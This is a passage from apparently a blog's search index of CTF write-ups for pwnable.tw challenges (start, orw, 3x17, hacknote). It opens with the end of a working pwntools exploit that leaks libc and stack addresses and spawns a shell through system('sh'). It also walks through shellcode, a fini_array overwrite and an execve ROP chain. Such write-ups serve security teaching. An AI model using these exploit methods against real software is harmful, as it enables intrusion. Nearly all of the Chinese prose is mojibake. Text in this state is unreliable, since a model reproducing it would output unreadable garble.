'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n# 4 reference\n\n[Cè¯­è¨€alarm()å‡½æ•°ï¼šè®¾ç½®ä¿¡å·ä¼ é€é—¹é’Ÿ](http://c.biancheng.net/cpp/html/334.html)\n\n[asprintf](https://blog.csdn.net/yuan08shandong/article/details/50580834)\n","tags":["heap"],"categories":["CTF"]},{"title":"pwnable.twä¹‹start-ORW-3x17","url":"/2020/03/04/startORW317/","content":"\nè¿™é‡ŒæŠŠpwnable.twä¸Šå‰é¢çš„å‡ ä¸ªé¢˜æ”¾åœ¨ä¸€èµ·å†™ç¯‡åšå®¢ï¼Œåˆ†åˆ«æ˜¯ï¼š\n\n- start\n- orw\n- 3x17\n\n# 1 start\n\n## 1.1 é¢˜ç›®\n\nhttps://pwnable.tw/challenge/#1\n\n## 1.2 åˆ†æ\n\né¦–å…ˆï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§å’Œå¼€å¯çš„ä¿æŠ¤æªæ–½ï¼š\n\n![](start1.png)\n\nè¿è¡Œèµ·æ¥è¯•è¯•ï¼š\n\n![](start2.png)\n\nIDAæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶startï¼š\n\n![](start3.png)\n\n![](start4.png)\n\nå‘ç°é™¤äº†_startå’Œ_exitæ²¡æœ‰ç†Ÿæ‚‰çš„mainå‡½æ•°ï¼Œä½¿ç”¨IDAæŸ¥çœ‹ä¼ªä»£ç ä¹Ÿä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å‡½æ•°ï¼ŒåŸå› åœ¨äºè¿™æ˜¯ä¸€ä¸ªçº¯æ±‡ç¼–ä»£ç ã€‚\n\nå› æ­¤æˆ‘ä»¬éœ€è¦çœ‹æ‡‚è¿™æ®µæ±‡ç¼–éƒ½åšäº†äº›ä»€ä¹ˆï¼š\n\n1    å‹äº†_exitå‡½æ•°çš„åœ°å€\n\n2    æ¸…eax,ebx,ecx,edx\n\n3    å‹å­—ç¬¦ä¸²ï¼Œ20ä¸ªå­—èŠ‚\n\n4    åˆ†åˆ«ç»™eax,ebx,ecx,edxèµ‹å€¼(4,1,esp,20),ç„¶åint 80hç³»ç»Ÿè°ƒç”¨\n\n5    æ¸…ebx,ç»™eax,edxèµ‹å€¼ï¼ˆ3ï¼Œ60ï¼‰ï¼Œç„¶åint 80hç³»ç»Ÿè°ƒç”¨\n\n6    espåŠ 20ä¸ªå­—èŠ‚æ”¶å›æ ˆç©ºé—´\n\n7    æ ¹æ®æ ˆä¸Šçš„è¿”å›åœ°å€ï¼ˆ_exitï¼‰è¿”å›\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼ˆeaxæ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œç„¶åebxï¼Œecxï¼Œedxï¼Œesxï¼Œediåˆ†åˆ«æ”¾ç½®ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼‰ã€‚æŸ¥è¡¨å¯çŸ¥4å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æ˜¯writeï¼Œ3å¯¹åº”çš„æ˜¯readã€‚\n\nå› æ­¤ä»¥ä¸Š4å’Œ5å¯ä»¥ç¿»è¯‘æˆï¼š\n\n```c\nwrite(1,esp,20); // ä»æ ˆä¸Šè¯»20ä¸ªå­—èŠ‚åˆ°æ ‡å‡†è¾“å‡ºï¼ˆè¯»å†…å­˜ï¼‰\nread(0,esp,60);  // ä»æ ‡å‡†è¾“å…¥å†™60ä¸ªå­—èŠ‚åˆ°æ ˆä¸Šï¼ˆå†™å†…å­˜ï¼‰\n```\n\nå¾ˆæ˜æ˜¾æ˜¯ä¸ªæ ˆæº¢å‡ºï¼Œreadçš„60ä¸ªå­—èŠ‚ä¼šè¦†ç›–åˆ°è¿”å›åœ°å€exitã€‚\n\n![](start5.png)\n\n## 1.3 åˆ©ç”¨\n\nexitè¢«è¦†ç›–åï¼Œå°±æ§åˆ¶äº†eipï¼Œæ­¤æ—¶åº”è¯¥è®©eipæŒ‡å‘å“ªå„¿æ‰èƒ½get shellå‘¢ï¼Ÿå½“ç„¶æ˜¯æŒ‡å‘æˆ‘ä»¬æ„é€ çš„ä¸€æ®µshellcodeï¼Œshellcodeåº”è¯¥æ”¾å“ªå„¿å‘¢ï¼Ÿå¦‚æœæ”¾åœ¨æ ˆä¸Šï¼Œä½†æ­¤æ—¶æˆ‘ä»¬å¹¶ä¸çŸ¥é“æ ˆçš„åœ°å€ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æ³„éœ²æ ˆåœ°å€å‘¢ï¼Ÿå†çœ‹ä¸€ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n![](start6.png)\n\nç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œretnä¹‹åï¼ŒespæŒ‡å‘ä¸‹å›¾ä½ç½®ï¼š\n\n![](start7.png)\n\nå¦‚æœæ­¤æ—¶ä»08048070å¤„å¼€å§‹æ‰§è¡Œï¼Œå°±å¯ä»¥å°†old espçš„å€¼æ‰“å°å‡ºæ¥ï¼Œold esp = esp+4ã€‚å¹¶ä¸”å¯ä»¥ç»§ç»­ä»æ­¤espæŒ‡å‘çš„ä½ç½®å†™0x3Cå­—èŠ‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œespå¾€ä¸Šæ˜¯ç¬¬äºŒæ¬¡çš„è¾“å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å¥½å¥½æ„é€ è¿™æ¬¡è¾“å…¥ï¼Œè®©ä¸‹æ¬¡æ‰§è¡Œretnæ—¶ï¼Œå†ä¸€æ¬¡åŠ«æŒeipï¼ˆå³ret addrï¼‰ï¼Œå°†ret addrè¦†ç›–ä¸ºshellcode addrå³å¯ã€‚\n\n![](start8.png)\n\nç°åœ¨é‡æ–°ç†ä¸€ä¸‹ï¼Œoldespæ˜¯writeç³»ç»Ÿè°ƒç”¨æ—¶æ³„éœ²å‡ºæ¥çš„ï¼Œå› æ­¤shellcode addræ˜¯old esp+0x14ã€‚é‚£ä¹ˆç°åœ¨éœ€è¦æ‰¾ä¸€æ®µåˆé€‚çš„shellcodeæ¥get shellã€‚\n\nåœ¨http://shell-storm.org/shellcode/æ‰¾åˆ°ä¸€æ®µé•¿åº¦åˆé€‚çš„shellcodeå¦‚ä¸‹ï¼š\n\n![](start9.png)\n\n![](start10.png)\n\nexpå¦‚ä¸‹ï¼š\n\n![](start11.png)\n\næ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\n\n![](start12.png)\n\n![](start13.png)\n\n## 1.4 è®°å½•\n\n### 1.4.1 pwntoolsçš„ä½¿ç”¨\n\nhttps://pwntools.readthedocs.io/en/stable/about.html\n\nhttp://brieflyx.me/2015/python-module/pwntools-intro/\n\npwntoolsçš„cyclicï¼š\n\nhttps://www.cnblogs.com/liuyimin/p/7379985.html\n\n### 1.4.2 gdb-pedaçš„ä½¿ç”¨\n\n[https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/](https://introspelliam.github.io/2017/08/03/pwn/gdbçš„è°ƒè¯•ä¸ä½¿ç”¨/)\n\npwntools + gdbï¼š\n\nhttp://docs.pwntools.com/en/stable/gdb.html?highlight=gdb#module-pwnlib.gdb\n\n### 1.4.3 shellcode database\n\nhttp://shell-storm.org/shellcode/\n\n# 2 orw\n\n## 2.1 é¢˜ç›®\n\nhttps://pwnable.tw/challenge/#2\n\n## 2.2 åˆ†æ\n\né¦–å…ˆï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§å’Œå¼€å¯çš„ä¿æŠ¤æªæ–½ï¼š\n\n![](orw1.png)\n\nè¿è¡Œèµ·æ¥è¯•è¯•ï¼š\n\n![](orw2.png)\n\nIDAæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶orwï¼š\n\n![](orw3.png)\n\nä¼ªä»£ç å¦‚ä¸‹ï¼š\n\n![](orw4.png)\n\nã€orw_seccomp()æ˜¯ä¸€ä¸ªè®¾ç½®å‡½æ•°ï¼Œè¿™é‡Œçš„ä½œç”¨æ˜¯è®¾ç½®åªèƒ½ä½¿ç”¨openï¼Œreadï¼Œwriteä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚å…·ä½“åŸç†å‚è€ƒ2.4.2ä¸­ã€‚ã€‘\n\nreadä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®æ”¾åˆ°shellcodeåœ°å€å¤„ï¼Œç„¶åè½¬åˆ°shellcodeå¤„å»æ‰§è¡Œä»£ç ã€‚\n\nshellcodeåœ°å€å¦‚ä¸‹ï¼š\n\n![](orw5.png)\n\nview, open subviews, segmentsæŸ¥çœ‹bssæ®µå±æ€§ï¼š\n\n![](orw6.png)\n\nã€è¿™é‡Œæ˜¾ç¤ºä¸å¯æ‰§è¡Œï¼Œä½†checksecä¸­RWXå±æ€§ä¸ºhas RWX segmentsä¸”å®é™…shellcodeæ”¾åˆ°bssæ®µä¸­åå¯æ‰§è¡Œï¼Œè¿™é‡Œç›®å‰è¿˜ä¸çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿã€‘\n\n## 2.3 åˆ©ç”¨\n\né¢˜ç›®åªå…è®¸ä½¿ç”¨openï¼Œreadï¼Œwriteä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œå› æ­¤é€šè¿‡è¿™ä¸‰ä¸ªå‡½æ•°å®ç°æ‰“å¼€/home/orw/flagæ–‡ä»¶ï¼Œå°†å…¶è¯»åˆ°bssæ®µæˆ–è€…æ ˆä¸­ï¼Œç„¶åå†å°†bssæˆ–æ ˆä¸­çš„æ•°æ®å†™åˆ°æ ‡å‡†è¾“å‡ºï¼ˆå³å±å¹•ä¸Šï¼‰æ‰“å°ã€‚\n\n![](orw7.png)\n![](orw8.png)\n\npayloadå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼š\n\n![](orw9.png)\n\næ‰§è¡Œå¾—åˆ°flagï¼š\n\n![](orw10.png)\n![](orw11.png)\n\n## 2.4 è®°å½•\n\n### 2.4.1 64ä½ubuntuå®‰è£…32ä½åº“\n\nubuntu 64ä½ç‰ˆæœ¬ï¼Œå®‰è£…æ”¯æŒ32ä½ç¨‹åºçš„äºŒè¿›åˆ¶åº“ã€‚\n\nsudo dpkg --add-architecture i386\n\nsudo apt-get update\n\nsudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386\n\n### 2.4.2 seccompå’Œprctl\n\n[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linuxæ²™ç®±ä¹‹seccomp/)\n\nhttps://www.jianshu.com/p/62ede45cfb2e\n\nhttps://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\n\n### 2.4.3 pwnlib.shellcraft.i386\n\nè¿™æ¬¡é¢˜ç›®ä¸­åªç”¨åˆ°äº†ä¸¤ä¸ªé‡è¦çš„å‡½æ•°ã€‚\n\nç¬¬ä¸€ä¸ªæ˜¯å°†å­—ç¬¦ä¸²pushåˆ°æ ˆä¸­ï¼Œæ­¤æ—¶espæŒ‡å‘çš„å°±æ˜¯è¿™æ®µå­—ç¬¦ä¸²ã€‚\n\n`pwnlib.shellcraft.i386.pushstr(string, append_null=True)`\n\n```python\n>>>print shellcraft.i386.pushstr('aaaa').rstrip()\n  /* push 'aaaa\\x00' */\n  push 1\n  dec byte ptr [esp]\n  push 0x61616161\n```\n\nç¬¬äºŒä¸ªæ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œsyscallæ˜¯è¦è°ƒç”¨çš„å‡½æ•°ï¼ˆeaxå­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œåé¢ç´§æ¥ç€çš„æ˜¯å„ä¸ªå‚æ•°ï¼ˆebxï¼Œecxï¼Œedxç­‰ï¼‰ï¼ˆå‚æ•°å¯ä»¥æ˜¯æŸä¸ªå¯„å­˜å™¨ï¼Œå¦‚â€™espâ€™ï¼‰ã€‚\n\n`pwnlib.shellcraft.i386.linux.syscall(syscall=None, arg0=None, arg1=None, arg2=None, arg3=None, arg4=None, arg5=None)`\n\n```python\n>>> print pwnlib.shellcraft.i386.linux.syscall('SYS_execve', 1, 'esp', 2, 0).rstrip()\n    /* call execve(1, 'esp', 2, 0) */\n    push SYS_execve /* 0xb */\n    pop eax\n    push 1\n    pop ebx\n    mov ecx, esp\n    push 2\n    pop edx\n    xor esi, esi\n    int 0x80\n```\n\nå‚è€ƒåˆ«äººçš„writeupï¼Œå‘ç°ç®€æ´å†™æ³•ï¼ˆå› ä¸ºæå‰ç”¨contextè®¾ç½®äº†ç›®æ ‡ç¯å¢ƒï¼‰ï¼š\n\n![](orw12.png)\n\n# 3 3x17\n\n## 3.1 é¢˜ç›®\n\nhttps://pwnable.tw/challenge/#32\n\n## 3.2 åˆ†æ\n\næŸ¥çœ‹æ–‡ä»¶ç±»å‹å’Œå¼€å¯çš„ä¿æŠ¤æœºåˆ¶ï¼š\n\n![](3171.png)\n\næ˜¯å»äº†ç¬¦å·è¡¨çš„ï¼Œä¸”é™æ€é“¾æ¥ã€‚å› æ­¤IDAçš„F5åŸºæœ¬ä¸Šæ²¡ç”¨äº†ï¼Œåªèƒ½çº¯çœ‹æ±‡ç¼–ã€‚å…ˆæ‰§è¡Œçœ‹çœ‹ï¼š\n\n![](3172.png)\n\nå±äºaddrå’Œdataï¼Œè¿™é‡ŒçŒœæµ‹ä¼šæ˜¯å°†dataå†™åˆ°addrä¸Šã€‚ åç»­æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œç¡®å®æ˜¯è¿™æ ·ã€‚\n\nIDAæ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåªæœ‰startå‡½æ•°ï¼š\n\n![](3173.png)\n\nä¸çŸ¥é“ä»¥ä¸Šå„åœ°å€å’Œå¯„å­˜å™¨çš„å€¼ä»£è¡¨ä»€ä¹ˆå†…å®¹ï¼Œå› æ­¤è‡ªå·±å†™äº†ä¸ªprintf(â€œhello world!\\nâ€)çš„å°ç¨‹åºï¼Œä½¿ç”¨IDAæ‰“å¼€ï¼Œæ‰¾åˆ°startå¯¹åº”çš„æ±‡ç¼–ï¼Œå¦‚ä¸‹ï¼š\n\n![](/3174.png)\n\nå› æ­¤3x17çš„startå¯è§£æä¸ºä¸‹å›¾ï¼š\n\n![](3175.png)\n\n64ä½æ±‡ç¼–å‚æ•°ä¼ é€’è§„åˆ™å¦‚ä¸‹ï¼š\n\n![](3176.png)\n\nå› æ­¤\n\n__libc_start_main(mian[sub_401B6D], argc, ubp_av, init [loc_4028D0], fini[sub_402960], rtld_fini)\n\nmainå‡½æ•°ä»£ç å¦‚ä¸‹ï¼š\n\n![](3177.png)\n\nsub_40EE70å…·ä½“åšäº†ä»€ä¹ˆï¼Œçœ‹æ±‡ç¼–ä»£ç å¤ªå¤æ‚ï¼Œå› æ­¤é€šè¿‡gdbè°ƒè¯•çœ‹ç»“æœï¼Œä½¿ç”¨gdbåœ¨401BEDå¤„ä¸‹æ–­ç‚¹ã€‚\n\n![](3178.png)\n\næ–­ç‚¹å¤„ä¿¡æ¯å¦‚ä¸‹ï¼š\n\n![](3179.png)\n\næ‰§è¡Œå®Œè¯¥å‡½æ•°ä¹‹åï¼Œè¿”å›å€¼ä¼šå­˜æ”¾åœ¨RAXä¸­ã€‚åˆšåˆšè¾“å…¥çš„æ˜¯12345ï¼Œè¿”å›å€¼ä¸º0x3039ï¼Œå³12345çš„åå…­è¿›åˆ¶ï¼Œå› æ­¤è¯¥å‡½æ•°å°±æ˜¯å°†è¾“å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢ä¸ºä¸€ä¸ªåå…­è¿›åˆ¶åœ°å€ã€‚\n\n![](31710.png)\n\ninitæ˜¯æ‰§è¡Œmainå‡½æ•°ä¹‹å‰ä¼šæ‰§è¡Œçš„ï¼Œè€Œfiniæ˜¯mainæ‰§è¡Œå®Œåæ‰§è¡Œçš„å‡½æ•°ã€‚\n\nå› æ­¤è€ƒè™‘ç”¨ä»»æ„åœ°å€å†™å»è¦†ç›–finiçš„æ‰§è¡Œæµç¨‹ã€‚å¦‚ä¸‹æ˜¯finiçš„æ±‡ç¼–ä»£ç ï¼Œåœ¨4B40F0å¤„åˆ†åˆ«è°ƒç”¨ä¸¤ä¸ªå‡½æ•°ï¼Œä¸”è°ƒç”¨é¡ºåºæ˜¯å…ˆfini_array[1]åfini_array[0]ã€‚é‚£ä¹ˆåªè¦å°†æ•°ç»„ä¸­çš„åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œå°±å¯ä»¥æ§åˆ¶ç¨‹åºå»æ‰§è¡Œäº†ã€‚\n\n![](31711.png)\n\n![](31712.png)\n\n## 3.3 åˆ©ç”¨\n\nè·å¾—ä»¥ä¸Šä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ï¼Œåº”å½“è®©fini_arrayçš„ä¸¤ä¸ªå‡½æ•°åœ°å€åˆ†åˆ«è¢«è¦†ç›–ä¸ºä»€ä¹ˆï¼Œæ‰èƒ½è¾¾åˆ°åˆ©ç”¨çš„ç›®çš„ã€‚åˆ©ç”¨å°±æ˜¯get shellã€‚åœ¨ç¨‹åºä¸­ä½¿ç”¨stringsæœç´¢â€œ/bin/shâ€æ— æœï¼Œå› æ­¤ä¸€æ­¥å®Œæˆget shellæ˜¯ä¸å¯èƒ½çš„ï¼Œéœ€è¦å¯»æ‰¾å…¶ä»–æ–¹æ³•ã€‚\n\nmainå‡½æ•°ä¸­å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œå¦‚æœå°†fini_array[1]çš„åœ°å€æŒ‡å‘mainï¼Œé‚£ä¹ˆä¼¼ä¹å°±å¯ä»¥ç»§ç»­ä»»æ„åœ°å€å†™ã€‚æŸ¥çœ‹mainå‡½æ•°ï¼Œå‘ç°byte_4B9330ä¸º1æ—¶æ‰èƒ½è¿›å…¥ä»»æ„åœ°å€å†™æ“ä½œï¼Œè€Œæˆ‘ä»¬ç¬¬äºŒæ¬¡è¿›å…¥è¯¥å‡½æ•°æ—¶byte_4B9330å·²ç»ä¸º2äº†ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿä½†æ˜¯çœ‹çœ‹å‰é¢çš„int8ï¼Œè¿™æ˜¯ä¸€ä¸ª8ä½æ— ç¬¦å·æ•´å½¢ï¼Œå› æ­¤ä¸ç”¨åŠ å¤šä¹…ï¼Œå°±æ•´æ•°æº¢å‡ºåˆå˜æˆ1äº†ã€‚\n\n![](31713.png)\n\né‚£ä¹ˆæ€ä¹ˆè®©mainä¸€ç›´è¢«è°ƒç”¨å‘¢ï¼Ÿå‰©ä¸‹çš„fini_array[0]å°±æ´¾ä¸Šç”¨åœºäº†ã€‚\n\n![](31714.png)\n![](31715.png)\n\næŠŠfini_array[1]å’Œfini_array[0]åˆ†åˆ«è¦†ç›–ä¸ºmainå’Œè°ƒç”¨arrayçš„finiå‡½æ•°ï¼Œå°±å¯ä»¥å®ç°å¦‚ä¸‹å¾ªç¯ã€‚\n\n![](31716.png)\n\nè¿™æ ·å°±å¯ä»¥ä¸é™æ¬¡æ•°çš„ä»»æ„åœ°å€å†™äº†ã€‚ä½†æ˜¯å¾€å“ªé‡Œå†™ï¼Œå†™ä»€ä¹ˆå†…å®¹å‘¢ï¼Ÿå› ä¸ºæ²¡æœ‰å¯å†™å¯æ‰§è¡Œæ®µï¼Œå› æ­¤ç›´æ¥æŠŠshellcodeå¸ƒç½®åˆ°å†…å­˜ç©ºé—´ä¸­è·³è½¬æ‰§è¡Œæ˜¯ä¸å¯èƒ½çš„ã€‚é‚£ä¹ˆå°±åªèƒ½è€ƒè™‘ROPäº†ï¼Œä½†ä¸çŸ¥é“æ ˆçš„ä½ç½®ï¼Œä¹Ÿæ²¡æ³•å»å¸ƒç½®æ ˆç©ºé—´å®ç°ROPã€‚ä¸è¿‡RIPæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå› æ­¤åªè¦å­˜åœ¨æŸä¸€åˆ»rspä¼šè¢«æ³„éœ²å‡ºæ¥ï¼Œé‚£ä¹ˆåªè¦åœ¨è¿™ä¸€åˆ»ä¹‹å‰æŠŠå¯¹åº”åœ°å€ç©ºé—´å¸ƒç½®å¥½ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¸æ–­åœ°retç„¶åæŠŠROPé“¾ä¸²èµ·æ¥å•¦ã€‚\n\nå›åˆ°finiå‡½æ•°ä¸­ï¼ŒrbpåŸæœ¬çš„å€¼è¢«æš‚æ—¶å­˜æ”¾åœ¨æ ˆä¸­ï¼Œè¿™é‡Œä»¥rbpåšä¸´æ—¶å¯„å­˜å™¨ï¼Œå­˜æ”¾äº†fini_arrayçš„èµ·å§‹åœ°å€ï¼Œæ­¤æ—¶rbp=0x4B40F0ã€‚\n\n![](31717.png)\n\nå¦‚æœcallæŒ‡ä»¤èƒ½è·³è½¬åˆ°leave; ret; è¿™æ ·çš„æŒ‡ä»¤å»ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶rspçš„åœ°å€äº†ã€‚å¦‚ä¸‹æ˜¯mainå‡½æ•°ä¸­ä¸€æ¡åˆé€‚çš„æŒ‡ä»¤ï¼š\n\n![](31718.png)\n\n```assembly\nrbp = 0x4B40F0\n\nleave:\nmov rsp,rbp          rsp = 0x4B40F0, rbp = 0x4B40F0\npop rbp                 rsp = 0x4B40F8, rbp = fini_array[0]\n\nret:\npop rip                  rsp = 0x4B4100, rip = fini_array[1]\n```\n\nè¿™é‡Œå¿…é¡»è®©fini_array[1]ä¸ºmainï¼Œfini_array[0]ä¸º0x401C4Bã€‚è¿™æ ·ripè¢«æ§åˆ¶å†å»æ‰§è¡Œä¸€æ¬¡mainå‡½æ•°ï¼Œåˆ©ç”¨æœ€åçš„retï¼Œä½¿ripä»0x4B4100å¤„æ‰§è¡Œï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬æå‰å¸ƒç½®å¥½çš„ç©ºé—´ã€‚\n\né‚£ä¹ˆæ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯æ€ä¹ˆå¸ƒç½®0x4B4100ä»¥ä¸Šçš„ç©ºé—´ï¼Œé€šè¿‡ROPçš„æ–¹å¼è·å–shellã€‚\n\nä¸€æ¡ç®€å•çš„è·å–shellçš„å‘½ä»¤ï¼š\n\n![](31719.png)\n\n32ä½ç³»ç»Ÿä¸Šé€šè¿‡int 80è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œ64ä½ç³»ç»Ÿä¸Šé€šè¿‡syscallæŒ‡ä»¤å®ç°ã€‚æ ¹æ®ä»¥ä¸Šä»£ç ï¼Œéœ€è¦æ§åˆ¶raxä¸º59ï¼ˆexecveçš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œ0x3Bï¼‰ï¼Œrdiä¸ºå­—ç¬¦ä¸²â€œ/bin/sh\\x00â€çš„åœ°å€ï¼Œrsiä¸º0ï¼Œrdxä¸º0ã€‚å› æ­¤rspæŒ‡å‘ä½ç½®çš„ROPé“¾åº”å¦‚æ­¤å¸ƒç½®ï¼š\n\n```assembly\npop_rax\n0x3B\npop rdi\naddr_of_bin_sh\npop rsi\n0\npop rdx\n0\nsyscall\n```\n\næœ€åï¼Œå­—ç¬¦ä¸²â€œ/bin/sh\\x00â€éšä¾¿æ‰¾ä¸€å—å¯å†™çš„ç©ºé—´å†™ä¸Šå»å°±è¡Œã€‚\n\nå¯»æ‰¾gadgetï¼š\n\n![](31720.png)\n\n![](31721.png)\n\n![](31722.png)\n\n![](31723.png)\n\n![](31724.png)\n\nå†™expï¼š\n\n![](31725.png)\n\næ‰§è¡Œè·å¾—flagï¼š\n\n![](31726.png)\n\n## 3.4 è®°å½•\n\n### 3.4.1 64ä½æ±‡ç¼–å‚æ•°ä¼ é€’\n\nhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n\n\n\n","categories":["CTF"]},{"title":"pwnable.twä¹‹hacknote","url":"/2020/03/01/hacknote/","content":"\n# 1 é¢˜ç›®\n\n[é¢˜ç›®é“¾æ¥](https://pwnable.tw/challenge/#5)\n\n![](hacknote-1.png)\n\næä¾›äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶hacknoteå’Œä¸€ä¸ªåº“libc.soã€‚\n\n# 2 åˆ†æ\n\né¦–å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ªé¢˜ç›®çš„å¯æ‰§è¡Œç¨‹åºã€‚è¿™æ˜¯ä¸€ä¸ª32bitçš„å¯æ‰§è¡Œç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ä¸”å»äº†ç¬¦å·è¡¨ã€‚è¯¥äºŒè¿›åˆ¶ç¨‹åºç¬¦å·è¡¨å¯è¯»å¯å†™ï¼Œå¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œå’Œcanaryä¿æŠ¤ï¼Œæ²¡æœ‰å¼€å¯åœ°å€éšæœºåŒ–ã€‚\n![](hacknote-2.png)\næ‰§è¡Œä»¥ä¸‹è¯•è¯•ã€‚å¦‚ä¸‹å›¾ï¼Œè¯¥ç¨‹åºæä¾›äº†å‡ ä¸ªåŠŸèƒ½ï¼Œæ·»åŠ /åˆ é™¤/æ‰“å°ç¬”è®°ã€‚æˆ‘ä»¬ç”¨IDAçœ‹çœ‹è¿™äº›åŠŸèƒ½çš„å®ç°ã€‚\n![](hacknote-3.png)\nï¼ˆ1ï¼‰add noteåŠŸèƒ½\n![](hacknote-4.png)\nAddæ“ä½œåªèƒ½æ‰§è¡Œ5æ¬¡ã€‚Sub_804862Bå‡½æ•°å¦‚ä¸‹ï¼Œå°†a1+4è¿™ä¸ªåœ°å€å¤„çš„æŒ‡é’ˆå–å‡ºï¼Œç„¶ååˆ©ç”¨putså°†è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹è¿›è¡Œæ‰“å°ã€‚\n![](hacknote-5.png)\nChunk1å’Œchunk2çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n![](hacknote-6.png)\nï¼ˆ2ï¼‰delete noteåŠŸèƒ½ï¼ˆè¿™é‡Œå­˜åœ¨æ¼æ´ç‚¹ï¼‰\n![](hacknote-7.png)\nå¯ä»¥çœ‹åˆ°ï¼Œdeleteå‡½æ•°å°†chunk2å’Œchunk1é‡Šæ”¾æ‰åï¼Œå¹¶æ²¡æœ‰å°†æŒ‡å‘å„chunkçš„æŒ‡é’ˆptr[v1]ç½®NULLï¼Œå¯¼è‡´äº†æ‚¬ç©ºæŒ‡é’ˆçš„äº§ç”Ÿã€‚\n\nï¼ˆ3ï¼‰print noteåŠŸèƒ½\n![](hacknote-8.png)\n\n# 3 åˆ©ç”¨\n\n> åˆ©ç”¨ä¸»è¦ä»ä¸¤ä¸ªæ–¹é¢å»è€ƒè™‘ï¼ˆä»¥ç¬¬2èŠ‚ä¸­chunk1å’Œchunk2çš„å›¾ä¸ºä¾‹ï¼‰ï¼š\n> 1ã€putsçš„å†…å®¹å°±æ˜¯chunk2ä¸­çš„å†…å®¹ï¼Œå› æ­¤è€ƒè™‘å°†chunk2ä¸­çš„å†…å®¹è¦†ç›–ä¸ºæˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚å¦‚libcä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å¾—åˆ°libcçš„åŸºå€ï¼Œä»è€ŒçŸ¥é“ä»»æ„ä¸€ä¸ªlibcå‡½æ•°åœ¨åŠ¨æ€æ‰§è¡Œæ—¶çš„åœ°å€ã€‚\n> 2ã€chunk1çš„çš„å†…å®¹éƒ¨åˆ†ï¼Œå‰å››ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶è¿™ä¸ªchunkçš„å‰å››ä¸ªå­—èŠ‚ï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€æ‰§è¡Œï¼ŒåŠ«æŒEIPã€‚ç„¶è€Œchunk1çš„å†…å®¹å¹¶éæˆ‘ä»¬èƒ½è½»æ˜“æ”¹åŠ¨çš„ï¼Œå› æ­¤éœ€è¦ç»“åˆglibcçš„å 